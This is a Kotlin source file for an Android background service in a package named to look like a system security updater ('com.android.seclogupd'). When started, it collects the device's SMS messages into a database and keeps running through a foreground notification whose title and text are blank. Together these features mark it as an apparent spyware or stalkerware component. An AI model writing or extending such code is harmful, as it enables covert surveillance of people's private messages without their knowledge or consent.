package com.android.seclogupd.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import com.android.seclogupd.data.DatabaseProvider
import com.android.seclogupd.logger.MetaLogger
import com.android.seclogupd.logger.SmsLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class LoggerService : Service() {

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        CoroutineScope(Dispatchers.IO).launch {
            val db = DatabaseProvider.getInstance(applicationContext)
            // TODO: شروع عملیات لاگ‌گیری از ماژول‌ها
            MetaLogger(applicationContext, db).logStart("sms")
            SmsLogger(applicationContext, db).collect()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundService() {
        val channelId = "logger_channel"
        val channelName = "Logger Service"
        val notificationId = 1

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, channelName,
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.stat_notify_more)
                .build()
        } else {
            TODO("VERSION.SDK_INT < O")
        }

        startForeground(notificationId, notification)
    }
}
